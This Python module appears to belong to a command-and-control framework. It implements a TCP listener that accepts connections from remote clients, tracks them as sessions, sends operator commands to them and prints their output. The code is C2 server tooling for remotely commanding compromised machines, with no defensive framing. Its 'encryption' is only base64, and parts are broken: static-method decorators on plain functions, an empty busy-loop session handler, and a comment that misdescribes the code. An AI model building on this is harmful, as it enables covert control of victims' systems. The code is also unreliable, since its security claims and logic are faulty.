import socket
import threading
import uuid
import base64

from c2session import C2Session
from globalvars import GlobalVar
from protocols.c2prototemplate import C2ProtoTemplate

_SESSIONS = GlobalVar._SESSIONS

@staticmethod
def encrypt(data):
    return base64.b64encode(data)

@staticmethod
def decrypt(data):
    return base64.b64decode(data)

class TCP_ENC_Proto(C2ProtoTemplate):
    def __init__(self, host: str = "0.0.0.0", port: int = 4000):
        C2ProtoTemplate.__init__(self, host, port)
        self.prompt = "TCP (enc) Session > "
        self.session_type = "tcp_enc"
        self.enabled = True

        if self.enabled:
            self.start()
            self.connThread = threading.Thread(target=self.accept_connections)
            self.connThread.start()

    def start(self) -> None:
        try:
            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener.bind((self.host, self.port))
            self.listener.listen(10)

            print(f"{self.host}:{self.port} - TCP (enc) listener")
        except Exception as e:
            print(f"Error starting server: {e}")

    def accept_connections(self) -> None:
        while True:
            try:
                client_socket, client_address = self.listener.accept()
                session_id = str(uuid.uuid4())[:8]
                self.activeSession = session_id
                temp_session = C2Session(session_id, client_socket, "tcp_enc")
                temp_session.set_address(client_address)

                _SESSIONS[session_id] = temp_session
                print(f"New session created: {session_id} - {client_address[0]} (tcp_enc)")
                self.get_system_info()
                threading.Thread(target=self.handle_session, args=(session_id,)).start()
            except Exception as e:
                print(f"Error accepting tcp connection: {e.__traceback__}")
                break

    @staticmethod
    def handle_session(session_id: str) -> None:
        while True:
            try:
                continue
            except Exception as e:
                print(f"Error handling session {session_id}: {e}")
                break

    def process_results(self, session_id: str) -> None:
        session = _SESSIONS[session_id]
        try:
            data = self.recv_response(session_id)
            if not data:
                print(f"Session {session_id} disconnected.")
                return
            response_lines = data.split('\n')
            for line in response_lines:
                print(f"{line}")
        except Exception as e:
            print(f"Error handling session {session_id}: {e}")

    def send_command(self, cmd: str) -> None:
        session = _SESSIONS[self.activeSession]
        command = f'{cmd}'  # Wrap command in quotes
        command_enc = encrypt(command.encode('utf-8') + b"\n")
        session.get_socket().sendall(command_enc)

    def recv_response(self, session_id: str) -> str:
        session = _SESSIONS[session_id]
        data_enc = session.get_socket().recv(1024)
        data = decrypt(data_enc).decode()
        return data.strip()